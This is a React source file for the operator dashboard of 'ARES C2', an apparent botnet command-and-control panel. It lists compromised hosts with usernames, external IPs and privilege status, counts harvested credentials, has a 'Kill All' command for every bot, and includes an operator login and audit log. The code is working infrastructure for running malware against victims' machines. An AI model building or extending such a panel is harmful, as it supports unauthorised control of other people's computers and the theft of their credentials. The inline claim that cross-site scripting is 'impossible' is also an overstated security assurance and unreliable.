import { useState, useEffect, useCallback } from 'react'
import './index.css'

// ── Types ──
interface Bot {
  id: string
  hostname: string
  username: string
  domain: string
  os: string
  arch: string
  pid: number
  external_ip: string
  country: string
  elevated: boolean
  status: string
  first_seen: string
  last_seen: string
}

interface Stats {
  bots: { total: number; active: number; sleeping: number; dead: number }
  credentials: number
  queue_length: number
}

interface AuditEntry {
  id: number
  operator: string
  action: string
  detail: string
  ip: string
  created_at: string
}

// ── API Client ──
const API_BASE = import.meta.env.VITE_API_URL || 'https://localhost:8443'

async function api<T>(path: string, opts?: RequestInit): Promise<T> {
  const token = localStorage.getItem('ares_token') || ''
  const res = await fetch(`${API_BASE}${path}`, {
    ...opts,
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
      ...opts?.headers,
    },
  })
  if (!res.ok) throw new Error(`API ${res.status}`)
  return res.json()
}

// ── Dashboard Component ──
function Dashboard({ stats }: { stats: Stats | null }) {
  if (!stats) return <div className="pulse" style={{ padding: 40, textAlign: 'center', color: 'var(--text-muted)' }}>Loading stats...</div>
  return (
    <div className="animate-in">
      <div className="stats-grid">
        <div className="stat-card blue">
          <div className="stat-label">Total Bots</div>
          <div className="stat-value">{stats.bots.total}</div>
          <div className="stat-sub">Registered agents</div>
        </div>
        <div className="stat-card green">
          <div className="stat-label">Active</div>
          <div className="stat-value">{stats.bots.active}</div>
          <div className="stat-sub">Online now</div>
        </div>
        <div className="stat-card yellow">
          <div className="stat-label">Sleeping</div>
          <div className="stat-value">{stats.bots.sleeping}</div>
          <div className="stat-sub">Waiting for beacon</div>
        </div>
        <div className="stat-card red">
          <div className="stat-label">Dead</div>
          <div className="stat-value">{stats.bots.dead}</div>
          <div className="stat-sub">Terminated</div>
        </div>
        <div className="stat-card purple">
          <div className="stat-label">Credentials</div>
          <div className="stat-value">{stats.credentials}</div>
          <div className="stat-sub">{stats.queue_length} in queue</div>
        </div>
      </div>
    </div>
  )
}

// ── Bot Table Component ──
function BotTable({ bots, onSelect }: { bots: Bot[]; onSelect: (id: string) => void }) {
  const timeSince = (dateStr: string) => {
    const seconds = Math.floor((Date.now() - new Date(dateStr).getTime()) / 1000)
    if (seconds < 60) return `${seconds}s ago`
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`
    return `${Math.floor(seconds / 86400)}d ago`
  }

  if (bots.length === 0) {
    return (
      <div className="empty-state">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
          <path d="M9 17.25v1.007a3 3 0 01-.879 2.122L7.5 21h9l-.621-.621A3 3 0 0115 18.257V17.25m6-12V15a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 15V5.25m18 0A2.25 2.25 0 0018.75 3H5.25A2.25 2.25 0 003 5.25m18 0V12a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 12V5.25" />
        </svg>
        <p>No bots registered yet</p>
        <p style={{ fontSize: 12, marginTop: 8 }}>Deploy agents to see them here</p>
      </div>
    )
  }

  return (
    <div className="table-container animate-in">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Hostname</th>
            <th>User</th>
            <th>IP</th>
            <th>OS</th>
            <th>Status</th>
            <th>Last Seen</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          {bots.map(bot => (
            <tr key={bot.id}>
              {/* React auto-escapes all values — XSS IMPOSSIBLE */}
              <td><code style={{ color: 'var(--accent)', fontSize: 11 }}>{bot.id.slice(0, 12)}…</code></td>
              <td style={{ fontWeight: 600 }}>{bot.hostname}</td>
              <td>{bot.username}{bot.elevated && <span title="Elevated" style={{ color: 'var(--danger)', marginLeft: 4 }}>⚡</span>}</td>
              <td><code style={{ fontSize: 11 }}>{bot.external_ip}</code></td>
              <td>{bot.os} {bot.arch}</td>
              <td><span className={`badge ${bot.status}`}>{bot.status}</span></td>
              <td style={{ color: 'var(--text-muted)', fontSize: 12 }}>{timeSince(bot.last_seen)}</td>
              <td>
                <button className="btn btn-ghost" style={{ padding: '4px 8px', fontSize: 11 }} onClick={() => onSelect(bot.id)}>
                  View
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

// ── Audit Log Component ──
function AuditLog({ entries }: { entries: AuditEntry[] }) {
  return (
    <div className="animate-in">
      <div className="table-container">
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>Operator</th>
              <th>Action</th>
              <th>Detail</th>
              <th>IP</th>
            </tr>
          </thead>
          <tbody>
            {entries.map(e => (
              <tr key={e.id}>
                <td style={{ fontSize: 11, color: 'var(--text-muted)' }}>{new Date(e.created_at).toLocaleString()}</td>
                <td style={{ fontWeight: 600 }}>{e.operator}</td>
                <td><span className="badge" style={{ background: 'var(--accent)20', color: 'var(--accent)' }}>{e.action}</span></td>
                <td>{e.detail}</td>
                <td><code style={{ fontSize: 11 }}>{e.ip}</code></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

// ── Login Component ──
function Login({ onLogin }: { onLogin: (token: string) => void }) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')
    try {
      const res = await fetch(`${API_BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      })
      if (!res.ok) {
        setError(res.status === 429 ? 'Too many attempts. Wait 15 minutes.' : 'Invalid credentials')
        return
      }
      const data = await res.json()
      localStorage.setItem('ares_token', data.token)
      onLogin(data.token)
    } catch {
      setError('Connection failed')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '100vh', background: 'var(--bg-primary)' }}>
      <div className="card animate-in" style={{ width: 360, padding: 40 }}>
        <h2 style={{ fontSize: 20, fontWeight: 700, marginBottom: 4, color: 'var(--accent)' }}>ARES C2</h2>
        <p style={{ color: 'var(--text-muted)', fontSize: 13, marginBottom: 32 }}>Operator Authentication</p>
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          <input type="text" placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} autoFocus required />
          <input type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} required />
          {error && <p style={{ color: 'var(--danger)', fontSize: 12 }}>{error}</p>}
          <button className="btn btn-primary" type="submit" disabled={loading} style={{ justifyContent: 'center' }}>
            {loading ? 'Authenticating...' : 'Login'}
          </button>
        </form>
      </div>
    </div>
  )
}

// ── Sidebar Navigation ──
type Page = 'dashboard' | 'bots' | 'audit'

function Sidebar({ page, setPage, onLogout }: { page: Page; setPage: (p: Page) => void; onLogout: () => void }) {
  const navItems: { id: Page; icon: string; label: string }[] = [
    { id: 'dashboard', icon: '📊', label: 'Dashboard' },
    { id: 'bots', icon: '🤖', label: 'Bots' },
    { id: 'audit', icon: '📋', label: 'Audit Log' },
  ]

  return (
    <div className="sidebar">
      <div className="sidebar-logo">
        ◆ ARES
        <span>C2 Panel v5.0</span>
      </div>
      {navItems.map(item => (
        <button
          key={item.id}
          className={`nav-item ${page === item.id ? 'active' : ''}`}
          onClick={() => setPage(item.id)}
        >
          <span>{item.icon}</span>
          {item.label}
        </button>
      ))}
      <div style={{ flex: 1 }} />
      <button className="nav-item" onClick={onLogout} style={{ color: 'var(--danger)' }}>
        <span>🚪</span> Logout
      </button>
    </div>
  )
}

// ── Main App ──
export default function App() {
  const [token, setToken] = useState(localStorage.getItem('ares_token') || '')
  const [page, setPage] = useState<Page>('dashboard')
  const [stats, setStats] = useState<Stats | null>(null)
  const [bots, setBots] = useState<Bot[]>([])
  const [auditEntries, setAuditEntries] = useState<AuditEntry[]>([])

  const fetchData = useCallback(async () => {
    if (!token) return
    try {
      const [s, b] = await Promise.all([
        api<{ bots: Stats['bots']; credentials: number; queue_length: number }>('/api/panel/stats'),
        api<{ bots: Bot[] }>('/api/panel/bots'),
      ])
      setStats(s)
      setBots(b.bots || [])
    } catch (err) {
      console.error('Fetch error:', err)
    }
  }, [token])

  useEffect(() => {
    fetchData()
    const interval = setInterval(fetchData, 10000) // Refresh every 10s
    return () => clearInterval(interval)
  }, [fetchData])

  const fetchAudit = useCallback(async () => {
    if (!token) return
    try {
      const data = await api<{ entries: AuditEntry[] }>('/api/panel/audit')
      setAuditEntries(data.entries || [])
    } catch (err) {
      console.error('Audit fetch error:', err)
    }
  }, [token])

  useEffect(() => {
    if (page === 'audit') fetchAudit()
  }, [page, fetchAudit])

  const handleLogout = () => {
    localStorage.removeItem('ares_token')
    setToken('')
  }

  if (!token) {
    return <Login onLogin={setToken} />
  }

  return (
    <div className="app">
      <Sidebar page={page} setPage={setPage} onLogout={handleLogout} />
      <main className="main-content">
        {page === 'dashboard' && (
          <>
            <div className="page-header">
              <div>
                <h1 className="page-title">Dashboard</h1>
                <p className="page-subtitle">Real-time overview of your operation</p>
              </div>
              <button className="btn btn-ghost" onClick={fetchData}>↻ Refresh</button>
            </div>
            <Dashboard stats={stats} />
            <div style={{ marginTop: 24 }}>
              <h3 style={{ fontSize: 16, fontWeight: 600, marginBottom: 16 }}>Recent Bots</h3>
              <BotTable bots={bots.slice(0, 10)} onSelect={(id) => { setPage('bots'); console.log('Selected:', id) }} />
            </div>
          </>
        )}

        {page === 'bots' && (
          <>
            <div className="page-header">
              <div>
                <h1 className="page-title">Bot Management</h1>
                <p className="page-subtitle">{bots.length} total agents</p>
              </div>
              <div style={{ display: 'flex', gap: 8 }}>
                <button className="btn btn-ghost" onClick={fetchData}>↻ Refresh</button>
                <button className="btn btn-danger" onClick={async () => {
                  if (confirm('Kill ALL bots?')) {
                    await api('/api/panel/kill-all', { method: 'POST' })
                    fetchData()
                  }
                }}>☠ Kill All</button>
              </div>
            </div>
            <BotTable bots={bots} onSelect={(id) => console.log('View bot:', id)} />
          </>
        )}

        {page === 'audit' && (
          <>
            <div className="page-header">
              <div>
                <h1 className="page-title">Audit Log</h1>
                <p className="page-subtitle">Operator activity trail</p>
              </div>
              <button className="btn btn-ghost" onClick={fetchAudit}>↻ Refresh</button>
            </div>
            <AuditLog entries={auditEntries} />
          </>
        )}
      </main>
    </div>
  )
}
